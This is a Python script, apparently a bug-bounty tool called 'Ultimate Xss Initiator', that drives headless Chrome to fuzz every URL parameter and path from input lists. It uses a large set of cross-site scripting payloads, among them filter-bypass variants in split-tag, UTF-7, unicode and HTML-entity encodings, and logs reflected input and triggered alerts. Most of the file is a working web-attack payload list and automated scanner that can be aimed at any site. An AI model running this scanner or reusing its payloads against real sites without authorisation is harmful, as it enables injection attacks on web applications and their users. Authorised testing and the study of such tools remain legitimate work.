red_color = "\033[91m"
magenta_color = "\033[95m"
cyan_color = "\033[96m"
white_color = "\033[97m"
reset_color = "\033[0m"
yellow_color="\033[93m"
clear_line = "\033[K"

banner=red_color+"""
     **     **    **     **   **            **** 
    /**    /**   //**   **   /**           */// *
    /**    /**    //** **    /**          /    /*
    /**    /**     //***     /**   *****     *** 
    /**    /**      **/**    /**  /////     *//  
    /**    /**     ** //**   /**           *     
    //*******     **   //**  /**          /******
     ///////     //     //   //           //////  

     Ultimate     Xss    Initiator
     						- by Abhishek Dirisipo
"""
print(banner)


from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from urllib.parse import urlparse, parse_qs, urlencode, quote
import os
import time
import sys

count=0

# Configure Chrome options for running in headless mode
chrome_options = Options()
chrome_options.add_argument("--headless")  # Run Chrome in headless mode

# Create a new instance of the Chrome driver
driver = webdriver.Chrome(options=chrome_options)

import glob
#***********************************************************************

print(white_color+"\nList of All text Files in Current Directory:\n")
file_count=0
for file in glob.glob("input/with_param/*.txt") :
    file_count+=1
    print(file_count,file)
for file in glob.glob("input/no_param/*.txt") :
    file_count+=1
    print(file_count,file)
for file in glob.glob("input/*.txt") :
    file_count+=1
    print(file_count,file)
for file in glob.glob("*.txt") :
    file_count+=1
    print(file_count,file)

file_count2=input(" ✨enter file number:  - ")

#********** function for file selecting through serial number *****
def fcount(file_count2):
    file_count=0
    for file in glob.glob("input/with_param/*.txt"):
        file_count+=1
        if file_count==file_count2:
            return file
            
    for file in glob.glob("input/no_param/*.txt"):
        file_count+=1
        if file_count==file_count2:
            return file
                        #1
    for file in glob.glob("input/*.txt"):
        file_count+=1
        if file_count==file_count2:
            return file
                        #2
    for file in glob.glob("*.txt"):
        file_count+=1
        if file_count==file_count2:
            return file
#*******************************************************************
fn=fcount(int(file_count2))
print(reset_color+"\nselected file: ",fn)

file1 = open(fn, 'r') 
Lines = file1.readlines()
print("\n🚀Total loaded urls:",len(Lines))

#____________ for resuming process_____________
try:
    with open('xsslogabhi/resume_stats_new/'+fn,'r') as ID1:
        temp=ID1.readline()
        resume_count=int(temp)
        print("\n💾 previous task has being resumed ...")
        time.sleep(1)

except:
    with open('xsslogabhi/resume_stats_new/'+fn,'w') as ID1:
        ID1.write("0")
        resume_count=0
#_________________________
value_flag=input("press 1 for custom payload")

#*************************************************************************************************************************************
unique_urls= set()

print("\n_____________________________________________________________________________")
print("\nplease wait .... generating url variations and removing duplicates for scan !")

for url in Lines:
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    #print(parsed_url)
    #print()
    #print(params)
    
    
    #*********************************** values #***********************************
    values1 = ['<abhi>""%3cabhi%3e%22%22',
               '%26lt;abhi%26gt;%26quot;%26quot',
               '#<abhi>"%3cabhi%3e%22%26lt;abhi%26gt;%26quot;',
               '%0d%0a%0d%0a"><body onload=alert()>',
               '</title>\'>"><img src=x onnull=null onerror=(prompt)(123)>',
              '%22;(confirm)(%27abhi%27);//',
              '%22%20autofocus%20onfocus=(confirm)()%20;',
              '%27;(confirm)(00);//',
              '`;(confirm)(00);//',
              '</sCrIpT >%27>"><audio%20src%20onloadstart=(prompt)(1*5)>',
              '<>hello</title><svg/onload=alert(%27OPENBUGBOUNTY%27)>',
              '%27>"><svg/onrandom=random%20onload=confirm(7-5)>',
              'hello<scr<sc<script>ript>ipt>alert(99999999999)</script>',
              'jAvAsCrIpT:(confirm)(1);//://',
              '<><<scr>/<scr>s<scr>c<scr>ript><<scr><scr>s<scr>c<scr>ript>alert(%27OPENBUGBOUNTY%27);<<scr>/<scr>s<scr>c<scr>ript>',
              '\u0027\u003e\u0022\u003e\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022(confirm)(document.domain)\u0022\u003e&SMAUTHREASON=7',
              'OF25MTNNGVS_LapsInTime%22%27testxxx%3E%3Ciframe%20src=%22data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E%22%3E%3C/iframe%3E',
              '%2522onload%253Dprompt(1)+class%253Dss11+',
              "JaVaSCriPt:/*-/*`/*\`/*'/*%22/**/(/* */oNlOaD=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",
              '%27%22%3E%3E%3Cmarquee%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E%3C%2Fmarquee%3E%22%3E%3C%2Fplaintext%5C%3E%3C%2F%7C%5C%3E%3Cplaintext%2Fonmouseover%3Dprompt%281%29%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%40gmail.com%3Cisindex%20formaction%3Djavascript%3Aalert%28%2FXSS%2F%29%20type%3Dsubmit%3E%27--%3E%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3Cimg%2Fid%3D%22confirm%26lpar%3B1%29%22%2Falt%3D%22%2F%22src%3D%22%2F%22onerror%3Deval%28id%26%2523x29%3B%3E%27%22%3E%3Cimg%20src%3D%22http%3A%2F%2Fi.imgur.com%2FP8mL8.jpg%22%3E',
              '1l%20onmouseover=alert(document.domain)%20y=/t1_i5sxroa',
              'alert(1);',
              '\\u002078907890;onnull=null\\u0022onload=\\u0022alert()\\u0022\\u0020onerror=\\u0022confirm()\\u0022',
              '&MailboxStatusAutoCall=alert(1)']
    
    values2=["78907890%3cabhi%3e%22%22ab''ab09870987",
             "%3cabhi%3e","%253cabhi%253e%2522%2522ab",
             "78907890%26lt%3Babhi%26gt%3B%26quot%3B%26quot%3Bab09870987",
             "78907890a&<abhi>\"\"ab''ab09870987",
             "78907890a&<abhi>\"\"ab''ab09870987",
             "78907890a&%3cabhi%3e%22%22ab%27%27ab09870987",
             "78907890a&%253cabhi%253e%2522%2522ab%2527%2527ab09870987"]
             
    #custom_value=['\\u002078907890;onnull=null\\u0022onload=\\u0022alert()\\u0022\\u0020onerror=\\u0022confirm()\\u0022']
    custom_value=['"><body%20onload=alert(456)>']    
    
    values3 = [
        "78907890%26%2360%26%2397%26%2398%26%23104%26%23105%26%2362%26%2334%26%2362%26%2334ab09870987", # method:14 HTML BYPASS using &#_ :
        "78907890%5Cu003Cabhi%5Cu003E%5Cu0022%5Cu0022ab09870987", # method:16 unicoded \\u + url encoded :
        "78907890%u003Cabhi%u003E%u0022%u0022ab09870987", # method:17 unicoded %u :
        "78907890%uff1cabhi%uff1e%22%22ab09870987", # method:18 %uff1c :
        "78907890\\uFF1Cabhi\\uFF1E%22%22\\uFE64abhi\\uFE65%22%22ab09870987", # method:19 \uFF1C \uFF1E(big < >) & \uFE64 \uFE65(small < >) :
        "78907890%2bADw-abhi%2bAD4-%2bACI-%2bACI-%2BADw-abhi%2BAD4-%2BACI-%2BACI-ab09870987", # method:20 UTF-7 +ADw- +AD4- +ACI- and url encoded :
        "78907890💋abhi💛%22%22ab09870987" # method:21 unicode emoji :
    ]
    
    values4 = [
        "78907890%26lt%26gt%26lt;%26gt;%26LT%26GT%26LT;%26GT;%26%2360;%26%2362%26%23060;%26%23062;%26%230060;%26%230062;%26%2300060;%26%2300062;%26%23000060;%26%23000062;%26%230000060;%26%230000062;%26%2360;%26%2362;%26%23060;%26%23062;%26%230060;%26%230062;%26%2300060;%26%2300062;%26%23000060;%26%23000062;%26%230000060;%26%230000062;%26%23x3c;%26%23x3e;%26%23x03c;%26%23x03e;%26%23x003c;%26%23x003e;09870987",
        "78907890%26%23x0003c;%26%23x0003e;%26%23x00003c;%26%23x00003e;%26%23x000003c;%26%23x000003e;%26%23x3c;%26%23x3e;%26%23x03c;%26%23x03e;%26%23x003c;%26%23x003e;%26%23x0003c;%26%23x0003e;%26%23x00003c;%26%23x00003e;%26%23x000003c;%26%23x000003e;%26%23X3c;09870987",
        "78907890%26%23X3e;%26%23X03c;%26%23X03e;%26%23X003c;%26%23X003e;%26%23X0003c;%26%23X0003e;%26%23X00003c;%26%23X00003e;%26%23X000003c;%26%23X000003e;%26%23X3c;%26%23X3e;%26%23X03c;%26%23X03e;%26%23X003c;%26%23X003e;%26%23X0003c;%26%23X0003e;%26%23X00003c;09870987",
        "78907890%26%23X00003e;%26%23X000003c;%26%23X000003e;%26%23x3C;%26%23x3E;%26%23x03C;%26%23x03E;%26%23x003C;%26%23x003E;%26%23x0003C;%26%23x0003E;%26%23x00003C;%26%23x0003E;%26%23x000003C;%26%23x000003E;%26%23x3C;%26%23x3E;%26%23x03C;%26%23x03E;%26%23x003C;09870987",
        "78907890%26%23x003E;%26%23x0003C;%26%23x0003E;%26%23x00003C;%26%23x00003E;%26%23x000003C;%26%23x000003E;%26%23X3C;%26%23X3E;%26%23X03C;%26%23X03E;%26%23X003C;%26%23X003E;%26%23X0003C;%26%23X0003E;%26%23X00003C;%26%23X00003E;%26%23X000003C;09870987",
        "78907890%26%23X000003E;%26%23X3C;%26%23X3E;%26%23X03C;%26%23X03E;%26%23X003C;%26%23X003E;%26%23X0003C;%26%23X0003E;%26%23X00003C;%26%23X00003E;%26%23X000003C;%26%23X000003E;\\x3c\\x3e\\x3C\\x3E\\u003c\\u003e\\u003C\\u003E09870987"
    ]

    if "1" in value_flag:
        values=custom_value
    else:
        values=values1+values2+values3+values4
    #***********************************         #***********************************
    
    
    
    main_url=(parsed_url.scheme+"://"+parsed_url.netloc+parsed_url.path)
    
    
    #**************************************
    
    
  #  print(white_color +"*** total unique urls ***")
    for param in params:
        url_with_param=(main_url+"?"+param+"=FUZZ")
        
        unique_urls.add(url_with_param)
    
    
    #url_with_hash=(main_url+"#FUZZ")
    #unique_urls.add(url_with_hash)
        
    url_with_path=(main_url+"/FUZZ")
    unique_urls.add(url_with_path)


    #custom
#    params=['/callback?error=','?error=','/openid_connect/callback?error=','/auth/openid_connect/callback?error=','?error_description=<body%20onload=alert("found-by-abhishek-dirisipo")>&state=8b9aac6dac3cdd826dcb32cb5709a066&error=authorization_error&nonce=1ca009f785999362cf2386ab76032667','/callback?error_description=<body%20onload=alert("found-by-abhishek-dirisipo")>&state=8b9aac6dac3cdd826dcb32cb5709a066&error=authorization_error&nonce=1ca009f785999362cf2386ab76032667']
#    for param in params:
#        url_with_param=(main_url+param+"FUZZ")
#        unique_urls.add(url_with_param)

    #print("****************************")
    
    #**************************************
print("\t\tcompleted !")
print("_____________________________________________________________________________")    
from selenium.common.exceptions import WebDriverException



print(white_color+"\t ** Total unique urls: ",len(unique_urls))
print("\t","___________"," |____________|","_______________________")
print("\t"," url count "," | percentage |"," current url details ")
print("\t","___________"," |____________|","_______________________")

for url in unique_urls:

    count+=1
    if count<=resume_count:
        #print("\t\t--> skipping:",count,end='\r')
        continue
        
        
    count2=0
    values_length=len(values)
    
    print("\t\t",count,end='\r')
    
    for value in values:
        count2+=1
        percentage=round(count2/values_length*100,2)

        sys.stdout.write(clear_line)
        print(reset_color + "\t\t", count, "  | ", percentage, "%        ", url.ljust(50),"  ", end='\r\r')
        
        try:
            url_with_value=(url.replace("FUZZ",value))
            #print(reset_color+"[*] Current url:",url_with_value,cyan_color+"here status")
            driver.get(url_with_value)

            page_source = driver.page_source
            if '<abhi>""'.lower() in page_source.lower():
                print(magenta_color +"\t[*]<abhi>\"\" vulnerable:         \n\t",url_with_value)
                with open('xsslogabhi/New_tool_log-1.txt','a') as f1:
                    f1.write('\n'+url_with_value) 
                    
                    
            elif "<><>" in page_source:
                print(white_color +"\t[*]<><> vulnerable:        \n\t",url_with_value)
                with open('xsslogabhi/New_tool_log-3.txt','a') as f1:
                    f1.write('\n'+url_with_value) 
            
            elif "<abhi>".lower() in page_source.lower():
                print(cyan_color+"\t[*]<abhi> vulnerable:         \n\t",url_with_value)        
                with open('xsslogabhi/New_tool_log-2.txt','a') as f1:
                    f1.write('\n'+url_with_value) 
            elif "<" in page_source.lower() :
                #print("\t[No reflections, just only <")
                temp2=1
            else:
                print(cyan_color+"\t[*]no html reflections:         \n\t",url_with_value)        

        except WebDriverException as e:
            if "unexpected alert open" in str(e).lower():
                print(red_color +"\t[*]alert triggered:          \n\t", url_with_value.replace(" ","%20"))
                with open('xsslogabhi/New_tool_alerts.txt','a') as f1:
                    f1.write('\n'+url_with_value)
                    
        except Exception as e: print(e)
                    
    if "1" not in value_flag:
        with open('xsslogabhi/resume_stats_new/'+fn,'w') as f_name:
            f_name.write(str(count)) 
print("\nscan completed : )")
driver.quit()    